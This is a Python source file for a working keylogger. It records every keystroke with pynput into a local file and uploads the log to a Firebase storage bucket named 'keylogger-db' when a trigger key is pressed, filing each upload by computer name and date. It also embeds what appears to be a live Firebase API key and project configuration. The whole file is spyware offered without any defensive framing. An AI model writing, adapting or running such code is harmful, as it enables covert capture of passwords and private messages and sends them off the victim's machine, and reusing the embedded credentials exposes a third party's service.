import os
from pynput.keyboard import Listener
from datetime import date
import pyrebase

config = {
    'apiKey': "AIzaSyBb3RZaXNh1jZYx_qwW_L6sKOxDzi7pMdA",
    'authDomain': "keylogger-db.firebaseapp.com",
    'databaseURL': "https://keylogger-db.firebaseio.com",
    'projectId': "keylogger-db",
    'storageBucket': "keylogger-db.appspot.com",
    'messagingSenderId': "282476825704",
    'appId': "1:282476825704:web:b9d206ed7519da3b7d3fdd",
    'measurementId': "G-TXMELPQRDB"
}
firebase = pyrebase.initialize_app(config)
storage = firebase.storage()

f = open('data.txt', 'w', encoding='utf-8')

data = ''
countDelete = 0


def on_press(key):
    try:
        if hasattr(key, 'char') and key.char == '0':
            f.close()
            today_date = date.today().strftime("%d/%m/%Y")
            today_date = today_date.replace('/', '.')
            storage.child(os.environ['COMPUTERNAME'] +
                          '/keylogs_' + today_date + '.txt') \
                .put('data.txt')
            os._exit(1)

        printKey(key)
    except:
        printKey(key)


def isValidLetter(key):
    return 'a' <= key <= 'z' or 'A' <= key <= 'Z' or key == '!' or key == '@' or key == '#' or key == '$' or \
           key == '%' or key == '^' or key == '&' or key == '*' or key == '(' or key == ')' \
           or key == '-' or key == '_' or key == '=' or key == '+' or key == '/' or key == '\\' or key == '`' \
           or key == '~' or key == '<' or key == '>' or key == '.' or key == ',' or key == ';' or key == ':' or key == '?' \
           or key == '[' or key == ']' or key == '{' or key == '}' or key == '"' or key == '\'' or key == '|' \
           or '1' <= key <= '9'


def printKey(key):
    global data, countDelete, f

    try:
        if str(key) == 'Key.enter':
            countDelete = 0
            data += '\n'
            print('\n')
            f.write('\n')

        elif str(key) == 'Key.backspace' and len(data) > 0:  # needs fixing !
            countDelete += 1
            if countDelete > 1:
                data = data[:-countDelete * 2 + 1] + str(data[-countDelete * 2 + 1] + '\u0336') \
                       + data[-countDelete * 2 + 2:]
            else:
                data = data[:-countDelete] + str(data[-countDelete] + '\u0336')
            f.close()
            f = open('data.txt', 'w', encoding='utf-8')
            f.write(data)

        elif str(key) == 'Key.space':
            countDelete = 0
            data += ' '
            print(' ')
            f.write(' ')

        elif str(key) == 'Key.tab':
            countDelete = 0
            data += '\t'
            print('\t')
            f.write('\t')

        elif hasattr(key, 'char'):
            countDelete = 0
            data += key.char
            print(key.char)
            f.write(key.char)

    except Exception as e:
        print(e)


# Collect events until released
with Listener(
        on_press=on_press) as listener:
    listener.join()
